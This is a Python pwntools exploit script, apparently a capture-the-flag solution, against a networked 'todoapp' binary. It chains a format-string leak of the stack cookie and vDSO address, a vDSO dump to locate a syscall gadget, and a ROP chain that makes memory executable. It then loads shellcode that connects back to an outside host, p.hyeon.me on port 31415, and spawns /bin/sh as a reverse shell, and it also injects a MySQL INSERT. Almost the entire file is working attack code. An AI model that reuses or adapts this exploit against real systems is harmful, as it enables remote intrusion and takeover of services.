#!/usr/bin/env python

import socket, struct, time
import collections
import ctypes

from pwn import *

def read_until(s, msg):
    result = s.recv(8192)
    while msg not in result:
        result += s.recv(8192)
    return result

context(arch='x86_64', os='linux')

q = lambda x: struct.pack("<q", x)
Q = lambda x: struct.pack("<Q", x)

TARGET = ('ssh.inc0gnito.com', 32323)
#TARGET = ('localhost', 32323)
todoapp = ELF('./todoapp')
todoapp.symbols['ret'] = 0x11c9
todoapp.symbols['load_gadget'] = 0x314a
todoapp.symbols['call_and_load_gadget'] = 0x3130
todoapp.symbols['pop_rdi_gadget'] = 0x3153
todoapp.symbols['pop_rsi_gadget'] = 0x3151
todoapp.symbols['temp_buffer'] = 0x206600
todoapp.symbols['0_addr'] = 0x206408
todoapp.symbols['ret_addr'] = 0x206400
todoapp.symbols['socket'] = 0x206408
todoapp.symbols['sockaddr_in'] = 0x206410
todoapp.symbols['shell'] = 0x206460
todoapp.symbols['add_rsp'] = 0x1d5f
todoapp.symbols['pop_rbp'] = 0x153b
todoapp.symbols['mov_eax_0'] = 0x2293 #mov eax, dword ptr [rbp - 8] ; pop rbp ; ret

leaked_offset = 0x3315

def gen_call(func, arg1=None, arg2=None, arg3=None, dummy=False):
    global todoapp
    d = 'B' * 6 * 8
    payload  = ''
    if arg3 is not None:
        if (arg1 & 0xFFFFFFFFFFFFFFFFL) < 2 ** 32:
            payload += q(0)
            payload += q(1)
            payload += q(func)
            payload += q(arg3)
            payload += q(arg2)
            payload += q(arg1)
            payload += q(todoapp.symbols['call_and_load_gadget'])
            payload += 'BBBBBBBB'
            if dummy:
                payload += d
            return payload
        else:
            payload += q(0)
            payload += q(1)
            payload += q(todoapp.symbols['ret_addr'])
            payload += q(arg3)
            payload += q(arg2)
            payload += q(0)
            payload += q(todoapp.symbols['call_and_load_gadget'])
            payload += 'BBBBBBBB' * 7
            payload += q(todoapp.symbols['pop_rdi_gadget'])
            payload += q(arg1)
    else:
        payload  = ''
        if arg1 is not None:
            payload += q(todoapp.symbols['pop_rdi_gadget'])
            payload += q(arg1)
        if arg2 is not None and arg3 is None:
            payload += q(todoapp.symbols['pop_rsi_gadget'])
            payload += q(arg2)
            payload += 'BBBBBBBB'
    payload += q(func)

    return payload

def exploit(exploiter):
    s = socket.socket()
    s.connect(TARGET)

    read_until(s, 'E. Quit')
    s.send('2')
    read_until(s, 'E. Quit')
    s.send('1')
    read_until(s, 'Just set user name')

    s.send(q(3000))
    s.send('1' * 3000)
    ss = read_until(s, 'E. Quit')

    index1 = ss.find('1' * 3000)
    index2 = ss.find(' [ERROR] ')
    ss = ss[index1 + len('1' * 3000):index2]
    ss += (8 - len(ss)) * '\x00'

    leaked = struct.unpack("<Q", ss)[0]

    todoapp.address = leaked - leaked_offset

    s.send('3')
    s.recv(8192)
    s.send(q(7))
    s.send('1111111')

    time.sleep(0.1)
    read_until(s, 'E. Quit')
    s.send('8')
    s.send(q(1))
    s.send(q(7))
    s.send('1111111')

    time.sleep(0.1)
    read_until(s, 'E. Quit')
    s.send('2')
    payload = exploiter.gen_payload()
    s.send(q(len(payload)))
    s.send(payload)

    time.sleep(0.1)
    read_until(s, 'E. Quit')
    s.send('9')
    s.send(q(1))
    s.send(q(-194))

    fake_structure  = ''
    fake_structure += q(0)
    fake_structure += q(todoapp.symbols['add_rsp'])
    fake_structure += q(0)
    fake_structure += q(0)
    fake_structure += q(0)

    s.send(q(len(fake_structure)))
    s.send(fake_structure)

    time.sleep(0.1)
    read_until(s, 'E. Quit')
    s.send('B')
    exploiter.process(s)

class StackLeaker(object):
    def __init__(self):
        self.index = 1
        self.size = 50
        self.result = []

    def next(self):
        self.index += self.size

    def gen_payload(self):
        format_length = 1000
        payload  = ''
        payload += q(todoapp.symbols['ret']) * (600 / 8)
        payload += q(todoapp.symbols['load_gadget'])
        payload += gen_call(todoapp.got['read'], 0, todoapp.symbols['ret_addr'], 8)
        payload += gen_call(todoapp.got['read'], 0, todoapp.symbols['0_addr'], 8)
        payload += gen_call(todoapp.got['read'], 0, todoapp.symbols['temp_buffer'], format_length, True)
        payload += q(todoapp.symbols['pop_rbp'])
        payload += q(todoapp.symbols['0_addr'] + 8)
        '''
        In our system, printf using sse when rax is not zero.
        It sometimes causes segfault(It use aligned instruction).
        So, make rax to 0
        '''
        payload += q(todoapp.symbols['mov_eax_0'])
        payload += 'BBBBBBBB'
        payload += gen_call(todoapp.plt['printf'], todoapp.symbols['temp_buffer'], 0)

        payload += 'A' * (3000 - len(payload) - 8)
        payload += 'ZZZZZZZZ'

        return payload

    def process(self, s):
        format_length = 1000
        time.sleep(0.1)
        s.send(q(todoapp.symbols['ret']))
        time.sleep(0.1)
        s.send(q(0))
        time.sleep(0.1)
        fmt = ' '.join(map(lambda x: '%' + str(x) + '$016llx', xrange(self.index, self.index + self.size)))
        fmt += '\n'
        fmt += '\x00' * (format_length - len(fmt))
        s.send(fmt)
        time.sleep(0.1)
        recv = s.recv(8192)
        result = map(lambda x: struct.unpack("<Q", x.decode('hex')[::-1])[0], recv.strip().split(' '))
        self.result += result

class VDSODumper(object):
    def __init__(self, filename, address):
        self.filename = filename
        self.address = address
        self.result = ''
        self.size = 0x2000

    def gen_payload(self):
        payload  = ''
        payload += q(todoapp.symbols['ret']) * (600 / 8)
        payload += q(todoapp.symbols['load_gadget'])
        payload += gen_call(todoapp.got['read'], 0, todoapp.symbols['ret_addr'], 8)
        payload += gen_call(todoapp.got['write'], 1, self.address + len(self.result), self.size - len(self.result), True)

        return payload

    def process(self, s):
        time.sleep(0.1)
        s.send(q(todoapp.symbols['ret']))
        time.sleep(0.1)
        recv = s.recv(8192)
        self.result += recv

    def run(self):
        while len(self.result) < self.size:
            exploit(self)

        with open(self.filename, 'wb') as f:
            f.write(self.result)


print ' [*] leak vdso address and stackcookie..'
leaker = StackLeaker()
for i in xrange(9):
    exploit(leaker)
    leaker.next()

base_index = -1
for (i, v) in enumerate(leaker.result):
    if v == 0x5a5a5a5a5a5a5a5aL:
        base_index = i
    if base_index != -1:
        if base_index + 3 == i:
            stackcookie_index = i
            stackcookie = v
        elif v == 0x21:
            vdso_address = leaker.result[i + 1]

print ' [*] dump vdso..'
dumper = VDSODumper('dumped_vdso', vdso_address)
dumper.run()

vdso = ELF('dumped_vdso')
found = False
for symbol in vdso.symbols:
    code = vdso.disasm(vdso.symbols[symbol], 0x100)
    if not found:
        for line in code.strip().split('\n'):
            if line.find('syscall') != -1:
                found = True
                break
            elif line.find('int') != -1 and line.find('0x80') != -1:
                found = True
                break
        if found:
            l = line.strip(' ').split(':')[0]
            l = '0' * (16 - len(l)) + l
            l = l.decode('hex')[::-1]
            syscall = struct.unpack('<Q', l)[0]

vdso.symbols['syscall'] = syscall
vdso.address -= vdso.symbols[''] & 0xfffffffffffff000L
vdso.address += vdso_address

libc = ctypes.CDLL('libc.so.6')
in_addr = libc.inet_addr(socket.gethostbyname('p.hyeon.me'))

reverse_shell_port = 31415

print ' [*] generate shell codes..'
connect_shell_code = asm('''
xor rdi, rdi
mov dil, AF_INET
xor rsi, rsi
mov sil, SOCK_STREAM
xor rdx, rdx
xor rax, rax
mov al, SYS_socket
syscall
mov rdi, rax
mov r15, {socket}
mov qword ptr [r15], rax
mov rax, {sockaddr_in}
xor rdx, rdx
mov word ptr [rax], 2
mov word ptr [rax + 2], {port}
mov dword ptr [rax + 4], {addr}
mov qword ptr [rax + 8], rdx
mov rsi, rax
mov dl, 16
xor rax, rax
mov al, SYS_connect
syscall
mov rdi, qword ptr [r15]
mov rsi, {shellcode}
xor rdx, rdx
mov dh, 0x4
xor rax, rax
mov al, SYS_read
syscall
mov rax, {shellcode}
call rax
'''.format(socket=todoapp.symbols['socket'], sockaddr_in=todoapp.symbols['sockaddr_in'], addr=in_addr, shellcode=todoapp.address + 0x500, port=socket.htons(reverse_shell_port)))

gen_shell_code = asm('''
mov rdi, qword ptr [r15]
mov rsi, STDIN_FILENO
mov rax, SYS_dup2
syscall
mov rdi, qword ptr [r15]
mov rsi, STDOUT_FILENO
mov rax, SYS_dup2
syscall
mov rdi, qword ptr [r15]
mov rsi, STDERR_FILENO
mov rax, SYS_dup2
syscall
mov rdi, 0
mov rsi, {execve_buffer}
mov rdx, 16
mov rax, SYS_read
syscall
mov rdi, {execve_buffer}
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
'''.format(execve_buffer=todoapp.symbols['shell']))

query_buffer = 0x100000
query_input_buffer = 0x100000 + 0x10000
inject_shell_code = asm('''
mov rdi, {query_buffer}
mov rsi, 0x10000
mov rdx, 7
mov r10, 0x32
mov r8, -1
mov r9, 0
mov rax, SYS_mmap
syscall
mov rdi, {query_input_buffer}
mov rsi, 0x10000
mov rdx, 7
mov r10, 0x32
mov r8, -1
mov r9, 0
mov rax, SYS_mmap
syscall
mov rax, {get_long}
call rax
mov rdi, {query_input_buffer}
mov rsi, rax
mov rax, {read_exact_bytes}
call rax
mov r14, rax
mov rax, {connect_db}
call rax
mov rdi, 0
mov rsi, {query_buffer}
mov rdx, 256
mov rax, SYS_read
syscall
mov r15, rax
add r15, {query_buffer}
mov rax, r15
mov byte ptr [rax], {quote}
inc rax
mov r15, rax
mov rdi, {conn}
mov rdi, qword ptr [rdi]
mov rsi, rax
mov rdx, {query_input_buffer}
mov rcx, r14
mov rax, {mysql_real_escape_string}
call rax
add rax, r15
mov byte ptr [rax], {quote}
inc rax
mov byte ptr [rax], {parenthesis}
inc rax
mov rdi, {conn}
mov rdi, qword ptr [rdi]
mov rsi, {query_buffer}
sub rax, {query_buffer}
mov rdx, rax
mov rax, {mysql_real_query}
call rax
mov rax, {disconnect_db}
call rax
'''.format(query_input_buffer=query_input_buffer,
    query_buffer=query_buffer,
    connect_db=todoapp.symbols['connect_db'],
    conn=todoapp.symbols['conn'],
    mysql_real_escape_string=todoapp.plt['mysql_real_escape_string'],
    mysql_real_query=todoapp.plt['mysql_real_query'],
    disconnect_db=todoapp.symbols['disconnect_db'],
    quote=ord('\''), parenthesis=ord(')'), get_long=todoapp.symbols['get_long'], read_exact_bytes=todoapp.symbols['read_exact_bytes']))

class ShellExploiter(object):
    def __init__(self, stackcookie):
        self.stackcookie = stackcookie

    def gen_payload(self):
        payload  = ''
        payload += q(todoapp.symbols['ret']) * (600 / 8)
        payload += q(todoapp.symbols['load_gadget'])
        payload += gen_call(todoapp.got['read'], 0, todoapp.symbols['ret_addr'], 8)
        payload += gen_call(todoapp.got['read'], 0, todoapp.symbols['ret_addr'] + 8, 10, True)
        payload += q(todoapp.symbols['load_gadget'])
        payload += q(0)
        payload += q(1)
        payload += q(todoapp.symbols['ret_addr'])
        payload += q(7)
        payload += q(0x1000)
        payload += q(0)
        payload += q(todoapp.symbols['call_and_load_gadget'])
        payload += 'BBBBBBBB' * 7
        payload += q(todoapp.symbols['pop_rdi_gadget'])
        payload += q(todoapp.address)
        payload += q(vdso.symbols['syscall'])
        payload += 'A' * (0x8 + 8 * 6)
        payload += q(todoapp.symbols['load_gadget'])
        payload += gen_call(todoapp.got['read'], 0, todoapp.address, 0x1000, True)
        payload += q(todoapp.address)

        return payload

    def process(self, s):
        s.send(q(todoapp.symbols['ret']))
        time.sleep(0.1)
        s.send('A' * 10)
        time.sleep(0.1)
        s.send(inject_shell_code)
        time.sleep(0.1)
        payload  = ''
        payload += 'A' * 520
        payload += Q(self.stackcookie)
        payload += 'AAAAAAAA' * 3
        payload += q(todoapp.symbols['load_gadget'])
        payload += q(0)
        payload += q(1)
        payload += q(todoapp.got['htons'])
        payload += q(7)
        payload += q(0x1000)
        payload += q(0x0a00)
        payload += q(todoapp.symbols['call_and_load_gadget'])
        payload += 'BBBBBBBB' * 7
        payload += q(todoapp.symbols['pop_rdi_gadget'])
        payload += q(todoapp.address)
        payload += q(vdso.symbols['syscall'])
        payload += 'A' * (0x8 + 8 * 6)
        for i, byte in enumerate(connect_shell_code):
            address = 0
            for candidate in todoapp.search(byte):
                if candidate >= todoapp.address + 0x800:
                    address = candidate
                    break
            payload += gen_call(todoapp.symbols['scp'], todoapp.address + i, address)
        payload += q(todoapp.address)

        s.send(q(len(payload)))
        s.send(payload)
        time.sleep(0.1)
        s.send('INSERT INTO messages(message) VALUES(')

        conn, addr = self.server_socket.accept()

        print ' [*] connection established'

        conn.send(gen_shell_code)
        time.sleep(0.1)
        conn.send('/bin/sh')

        print ' [*] shell ready'
        import telnetlib
        t = telnetlib.Telnet()
        t.sock = conn
        t.interact()

    def ready(self):
        self.server_socket = socket.socket()
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('0.0.0.0', reverse_shell_port))
        self.server_socket.listen(1)

print ' [*] ready for pwning'
exp = ShellExploiter(stackcookie)
exp.ready()
exploit(exp)
